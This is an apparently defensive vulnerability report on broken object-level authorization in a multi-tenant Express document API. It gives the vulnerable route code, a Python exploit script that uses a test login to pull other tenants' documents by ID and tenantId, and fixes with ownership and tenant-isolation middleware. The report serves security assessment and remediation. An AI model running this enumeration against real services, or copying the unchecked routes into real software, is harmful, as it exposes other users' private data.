# Vulnerability: Broken Object Level Authorization (BOLA)

## 1. Vulnerability Name
**Broken Object Level Authorization (BOLA) / Insecure Direct Object References (IDOR)**

## 2. Location in Code
- **File:** `backend/src/routes/documents.js` (Lines 25-35, 65-75, 85-95)
- **File:** `backend/src/routes/admin.js` (Lines 15-25)

```javascript
// No ownership verification in document access
router.get('/:id', auth, async (req, res) => {
    try {
        const document = await Document.findById(req.params.id)
            .populate('userId', 'email profile');
        // Missing: if (document.userId !== req.user._id) return 403;
    }
});

// Cross-tenant document access via query parameter
router.get('/', auth, async (req, res) => {
    const { tenantId } = req.query;
    const query = tenantId ? { tenantId } : { userId: req.user._id };
    // Missing: tenant ownership validation
});
```

## 3. Technical Root Cause
The application fails to verify that authenticated users can only access resources they own or are authorized to access. Object-level authorization checks are missing throughout the API.

**Root Causes:**
- Missing ownership verification in API endpoints
- No tenant isolation enforcement
- Direct object access using user-supplied IDs
- Insufficient authorization middleware
- Cross-tenant query parameter acceptance

## 4. Proof of Concept Explanation
1. Authenticate as regular user (test@tenantguard.com)
2. Obtain valid JWT token
3. Access documents using different tenant IDs via query parameters
4. Access any document directly using document IDs
5. Successfully retrieve data from other tenants/users

## 5. Exploit Script
**File:** `exploit-scripts/bola_exploit.py`

```python
#!/usr/bin/env python3
import requests

BASE_URL = "http://localhost:5000"

def exploit_bola():
    # Login as regular user
    login_data = {"email": "test@tenantguard.com", "password": "test123"}
    response = requests.post(f"{BASE_URL}/api/auth/login", json=login_data)
    
    token = response.json()["token"]
    headers = {"Authorization": f"Bearer {token}"}
    
    # Access documents from other tenants
    for tenant_id in ["507f1f77bcf86cd799439011", "507f1f77bcf86cd799439012"]:
        params = {"tenantId": tenant_id}
        doc_response = requests.get(f"{BASE_URL}/api/documents", 
                                  headers=headers, params=params)
        
        if doc_response.status_code == 200:
            docs = doc_response.json()
            print(f"[+] Accessed {len(docs)} documents from tenant {tenant_id}")
    
    # Direct document access by ID
    doc_ids = ["507f1f77bcf86cd799439013", "507f1f77bcf86cd799439014"]
    for doc_id in doc_ids:
        doc_response = requests.get(f"{BASE_URL}/api/documents/{doc_id}", 
                                  headers=headers)
        if doc_response.status_code == 200:
            print(f"[+] Successfully accessed document {doc_id}")
```

## 6. Impact
**Severity:** HIGH

**Business Impact:**
- Unauthorized access to sensitive documents
- Data privacy violations and regulatory non-compliance
- Competitive intelligence theft
- Customer data exposure across tenants

**Technical Impact:**
- Complete breakdown of multi-tenant isolation
- Horizontal privilege escalation
- Data exfiltration capabilities
- Unauthorized document modification/deletion

**Attack Scenarios:**
- Competitor accessing proprietary documents
- Malicious user downloading all system documents
- Cross-tenant data mining and intelligence gathering
- Unauthorized document modification or deletion

## 7. Fix Recommendation

### Immediate Actions
1. **Implement Ownership Verification**
```javascript
// Document access with ownership check
router.get('/:id', auth, async (req, res) => {
    try {
        const document = await Document.findById(req.params.id);
        
        if (!document) {
            return res.status(404).json({ error: 'Document not found' });
        }
        
        // Verify ownership or shared access
        if (document.userId.toString() !== req.user._id.toString() && 
            !document.sharedWith.includes(req.user._id)) {
            return res.status(403).json({ error: 'Access denied' });
        }
        
        res.json(document);
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});
```

2. **Enforce Tenant Isolation**
```javascript
// Middleware for tenant validation
const enforceTenantIsolation = (req, res, next) => {
    if (req.query.tenantId && req.query.tenantId !== req.user.tenantId.toString()) {
        return res.status(403).json({ error: 'Cross-tenant access denied' });
    }
    next();
};

router.get('/', auth, enforceTenantIsolation, async (req, res) => {
    const query = { 
        userId: req.user._id,
        tenantId: req.user.tenantId 
    };
    const documents = await Document.find(query);
    res.json(documents);
});
```

3. **Create Authorization Middleware**
```javascript
const authorizeDocumentAccess = async (req, res, next) => {
    try {
        const document = await Document.findById(req.params.id);
        
        if (!document) {
            return res.status(404).json({ error: 'Document not found' });
        }
        
        const hasAccess = document.userId.toString() === req.user._id.toString() ||
                         document.sharedWith.some(share => share.userId.toString() === req.user._id.toString()) ||
                         req.user.role === 'admin';
        
        if (!hasAccess) {
            return res.status(403).json({ error: 'Access denied' });
        }
        
        req.document = document;
        next();
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
};
```

### Long-term Security Measures
- Implement role-based access control (RBAC)
- Add resource-level permissions system
- Create audit logging for all data access
- Implement data classification and labeling
- Add automated authorization testing
- Regular access control reviews and audits

### Testing Strategy
1. Unit tests for authorization functions
2. Integration tests for cross-tenant isolation
3. Automated security testing in CI/CD
4. Regular penetration testing
5. Access control matrix validation